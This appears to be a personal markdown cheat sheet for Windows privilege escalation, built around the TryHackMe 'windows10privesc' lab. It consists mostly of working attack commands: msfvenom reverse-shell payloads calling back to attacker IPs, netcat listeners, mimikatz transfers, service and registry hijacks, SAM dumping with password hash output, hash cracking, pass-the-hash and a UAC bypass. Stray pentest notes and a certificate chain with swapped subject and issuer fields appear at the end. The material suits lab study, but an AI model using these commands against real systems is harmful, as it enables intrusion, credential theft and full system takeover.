# 1. TEST SETUP/ENVIRONMENT

## TRYHACKME
```
https://tryhackme.com/room/windows10privesc

VULENRABLE VM ACCESS
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.63.26 

PAYLOAD CREATION
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe

LISTENER SETUP (OPTION1)
msfconsole
use exploit/multi/handler 
set payload windows/x64/shell_reverse_tcp
set lhost 10.18.5.137
set lport 1234
run

LISTENER SETUP (OPTION2)
nc -nlvp 1234

COPY FROM KALI TO WINDOWS - USING SMB SERVER & COPY
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
copy \\192.168.174.132\kali\mimikatz.exe C:\PrivEsc\mimikatz.exe

COPY FROM KALI TO WINDOWS - USING PYTHON WEB SERVER & POWERSHELL
(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/mimikatz.exe", "C:\temp\mimikatz.exe")
(New-Object System.Net.WebClient).DownloadFile("http://192.168.174.132:8000/SharpHound.exe", "C:\temp\SharpHound.exe")

COPY FROM KALI TO LINUX - USING PYTHON WEB SERVER & WGET
cd /var/www/html/priv_esc
python3 -m http.server
wget http://10.18.5.137:8000/shell.elf
```

## TOOLS
```
VICTIM WINDOWS 

accesschk.exe
AdminPaint.lnk
CreateShortcut.vbs
lpe.bat
plink.exe
PowerUp.ps1
PrintSpoofer.exe
Procmon64.exe
PsExec64.exe
reverse.exe
RoguePotato.exe
savecred.bat
Seatbelt.exe
SharpUp.exe
winPEASany.exe


ATTACK MACHINE KALI 
reverse.exe
```



# 2. MANUAL ENUMERATION 


USERS
whoami
whoami /all
net users 
net users test


HOSTNAME
hostname


OS VERSION AND ARCHITECTURE
systeminfo
systeminfo I findstr /B / C: “OS Name" /C: “OS Version" /C:"System Type"

Findstr - search for a specific text string in computer files
/B - match patterns at the beginning of a line
/C - specify a particular search string


RUNNING PROCESS & SERVICES
tasklist - #list the running processes on Windows
tasklist /SVC - #return processes that are mapped to a specific Windows service



## USERS
```

```

## HOSTNAME
```
hostname
```

## OS VERSION & ARCHITECTURE
```

```

## RUNNING PROCESS & SERVICES
```

```

## NETWORK INFORMATION 
```

```

## FIREWALL STATUS AND RULES
```

```

## SCHEDULED TASKS
```

```

## INSTALLED APPS & PATCH LEVELS
```

```

## READABLE/WRITABLE FILES AND DIRECTORIES
```

```

## UNMOUNTED DISKS
```

```

## DEVICE DRIVERS AND KERNEL MODULES
```

```

## BINARIES THAT AUTO ELEVATE
```

```

# 3. AUTOMATED ENUMERATION 

## WINPEAS
```
winPEASany.exe

Seatbelt.exe

PowerUp.ps1

SharpUp.exe
```




# 4. MISCONFIGURATIONS/VULNERABILITIES EXPLOITATION 

## CATEGORY "SERVICES" - INSECURE SERVICE PERMISSIONS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

accesschk.exe /accepteula -uwcqv user daclsvc
sc qc daclsvc
sc config daclsvc binpath="\"C:\PrivEsc\reverse.exe\""
sc qc daclsvc
sc start daclsvc
```

## CATEGORY "SERVICES" - UNQUOTED SERVICE PATHS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

sc qc unquotedsvc
accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"

sc start unquotedsvc
```

## CATEGORY "SERVICES" - WEAK REGISTRY PERMISSIONS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
winPEASany.exe servicesinfo (cmd)

sc qc regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
regedit
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net start regsvc
```

## CATEGORY "SERVICES" - INSECURE SERVICES EXECUTEABLES
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

.\winPEASany.exe servicesinfo (powershell)
C:\PrivEsc\winPEASany.exe servicesinfo (cmd)

sc qc filepermsvc
C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
net start filepermsvc
```

## CATEGORY "REGISTRY" - AUTORUNS 
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
C:\PrivEsc\accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

cd /var/www/html/priv_esc
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .

copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
copy C:\PrivEsc\reverse.exe "C:\Program Files\Autorun Program\program.exe" /Y

nc -nlvp 1234
rdesktop 10.10.128.34
admin/password123
```

## CATEGORY "REGISTRY" - ALWAYSINSTALLELEVATED
```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=53 -f msi -o reverse.msi
copy \\10.18.5.137\\kali\reverse.msi C:\PrivEsc\reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi
```

## CATEGORY "PASSWORDS" - REGISTRY
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
 
reg query HKLM /f password /t REG_SZ /s
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon"
C:\PrivEsc\winPEASany.exe filesinfo

winexe -U 'admin%password123' //10.10.6.138 cmd.exe
```

## CATEGORY "PASSWORDS" - SAVED CREDENTIALS
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

cmdkey /list

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe

runas /savecred /user:admin C:\PrivEsc\reverse.exe
```

## CATEGORY "PASSWORDS" - SECURITY ACCOUNT MANAGER
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe

copy C:\Windows\Repair\SYSTEM \\10.18.5.137\kali\
copy C:\Windows\Repair\SAM \\10.18.5.137\kali\

sudo git clone https://github.com/Tib3rius/creddump7
sudo pip3 install pycrypto
sudo python3 creddump7/pwdump.py SYSTEM SAM

locate secretsdump.py 
python3 /opt/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
python3 /usr/lib/python3/dist-packages/impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -sam SAM -system SYSTEM LOCAL

Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2:::
user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a:::
admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::

sudo echo "admin:1001:aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da:::" > hash.txt


john --format=NT hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

pth-winexe -U 'admin%password123' //10.10.93.233 cmd.exe
xfreerdp /u:admin /p:password123 /cert:ignore /v:10.10.93.233
```

## CATEGORY "PASSWORDS" - PASSTHEHASH
```
pth-winexe -U 'admin%aad3b435b51404eeaad3b435b51404ee:a9fdfa038c4b75ebc76dc855dd74f0da' //10.10.222.90 cmd.exe
```




## CATEGORY "SCHEDULED TASKS" - INSECURE PERMISSIONS 
### Scenario 1
```
type C:\DevTools\CleanUp.ps1
C:\PrivEsc\accesschk.exe /accepteula -quvw user C:\DevTools\CleanUp.ps1

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.9.85.8 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.9.85.8\kali\reverse.exe C:\PrivEsc\reverse.exe

echo C:\PrivEsc\reverse.exe >> C:\DevTools\CleanUp.ps1
nc -lvp 123
```
### Scenario 2
```
schtasks /query /fo LIST /v
```

## CATEGORY "INSECURE GUI APPS"
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34

tasklist /V | findstr mspaint.exe
file://C:/windows/system32/cmd.exe
```

## CATEGORY "STARTUP APPS"
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
C:\PrivEsc\accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
cscript C:\PrivEsc\CreateShortcut.vbs
rdesktop -u admin 10.10.88.2
```

## CATEGORY "TOKEN IMPERSONATION" - ROTTEN POTATO

## CATEGORY "TOKEN IMPERSONATION" - ROUGE POTATO

## CATEGORY "TOKEN IMPERSONATION" - PRINTSPOOLER
```
xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.128.34
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.18.5.137 LPORT=1234 -f exe -o reverse.exe
python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
copy \\10.18.5.137\kali\reverse.exe C:\PrivEsc\reverse.exe
PSExec64.exe -i -u "nt authority\local service" C:\PrivEsc\reverse.exe
PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i
```

## UAC BYPASS
```
whoami /groups
powershell.exe Start-Process cmd.exe -Verb runAs
Sighcheck.exe -a -m C:\Windows\System32\fodhelper.exe
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d “cmd.exe” /f
```

## OTHERS - ARRANGE
```
runas /user:USER­NAME “C:\full\path\of\Program.exe”

runas /user:Adminsitrator “C:\Windows\system32\notepad.exe”
runas /user:Adminsitrator “C:\Windows\system32\cmd.exe”
runas /user:rgeller “C:\temp\mimikatz.exe”
runas /user:rgeller /WAIT /B "c:/windows/system32/cmd.exe"

zenmap
Kali Linux
vmware player
Kali Linux 
nessus
burpsuite
lightsoot
greenshot
7-zip
notepad++
visul studio code
wireshark

sslscan 172.16.3.17:3389

SMB Signing not required
enum4linux -a 172.16.3.13   

postgres pentest
openvpn server 1194 pentest

SSL CERTIFICATE CANNOT BE TRUSTED
https://shagihan.medium.com/what-is-certificate-chain-and-how-to-verify-them-be429a030887

└─$ curl -I https://shhq.datalines.com.sg/index.jsp



Root CA
Subject: name of the root CA
Issuer: name of the root CA


Intermediate CA
Subject: Name of the intermediate CA
Issuer: Name of the root CA


Server Certificate
Subject: Name of the certificate CA
Issuer: Name of the intermediate CA




USERTrust RSA Certification Authority
Sectigo RSA Domain Validation Secure Server CA
*.datalines.com.sg



Root CA
Subject: USERTrust RSA Certification Authority
Issuer: USERTrust RSA Certification Authority


Intermediate CA
Subject: Sectigo RSA Domain Validation Secure Server CA
Issuer: USERTrust RSA Certification Authority


Server Certificate
Subject: Sectigo RSA Domain Validation Secure Server CA
Issuer: *.datalines.com.sg
```





